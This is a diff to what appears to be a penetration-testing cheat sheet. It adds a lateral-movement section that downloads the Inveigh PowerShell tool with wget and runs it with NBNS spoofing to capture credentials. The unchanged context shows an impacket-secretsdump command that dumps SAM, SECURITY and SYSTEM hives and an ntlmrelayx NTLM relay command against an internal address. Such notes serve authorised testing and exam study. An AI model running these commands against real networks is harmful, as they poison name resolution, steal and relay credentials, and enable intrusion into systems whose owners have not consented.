@@ -45,6 +45,7 @@
     - [AD](#ad)
 - [Lateral Movement](#lateral-movement)
   - [NTLM Relay](#ntlm-relay)
+  - [Inveigh](#inveigh)
   - [PsExec](#psexec)
   - [WMI winRM](#wmi-winrm)
   - [DCOM](#dcom)
@@ -501,6 +502,11 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
 ## NTLM Relay 
 ```bash
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c 
+```
+## Inveigh
+```bash
+wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y 
 ```
 ## PsExec
 ```powershell
